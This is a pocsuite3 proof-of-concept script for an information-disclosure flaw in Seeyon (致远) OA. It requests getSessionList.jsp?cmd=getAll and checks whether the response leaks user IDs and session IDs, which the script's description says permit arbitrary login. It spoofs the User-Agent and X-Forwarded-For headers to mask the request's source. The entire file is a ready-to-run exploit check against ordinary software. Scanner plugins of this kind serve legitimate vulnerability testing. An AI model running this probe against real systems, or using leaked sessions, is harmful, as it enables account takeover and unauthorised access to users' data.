#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import contextlib
from poc_tool.tools import tools
from pocsuite3.api import (
    minimum_version_required, POCBase, register_poc, requests, logger
)

minimum_version_required('2.0.5')


class DemoPOC(POCBase):
    vulID = '0'
    version = '1'
    author = ''
    vulDate = '2023-11-18'
    createDate = '2023-11-18'
    updateDate = '2023-11-18'
    references = []
    name = '致远OA_getSessionList.jsp_Session泄漏'
    appPowerLink = ''
    appName = '致远OA'
    appVersion = '致远互联-OA'
    vulType = 'Information Disclosure'
    desc = """
    通过使用存在漏洞的请求时，会回显部分用户的Session值，导致出现任意登录的情况
    """
    samples = ['']
    install_requires = ['']
    pocDesc = 'User manual of poc'
    dork = {'zoomeye': ''}
    suricata_request = ''
    suricata_response = ''

    def _exploit(self):
        headers = {
            'User-agent': tools.get_random_ua(),
            'X-Forwarded-For': tools.get_random_ip()
        }
        res = requests.get(url=f"{self.url}/yyoa/ext/https/getSessionList.jsp?cmd=getAll", headers=headers,
                           verify=False)
        logger.debug(f"\n\n{tools.get_req(res)}\n\n{tools.get_res(res)}")
        return "<usrID>" in res.text and "</sessionID>" in res.text and res.status_code == 200

    def _verify(self):
        with contextlib.suppress(Exception):
            result = {}
            res = self._exploit()
            if res:
                result['VerifyInfo'] = {
                    '[ Success ] 致远OA_getSessionList.jsp_Session泄漏 ': self.url,
                    '[ Payload ]': f"{self.url}/yyoa/ext/https/getSessionList.jsp?cmd=getAll"
                }
            return self.parse_output(result)

    def _attack(self):
        return self._verify()

    def _shell(self):
        return self._verify()


register_poc(DemoPOC)
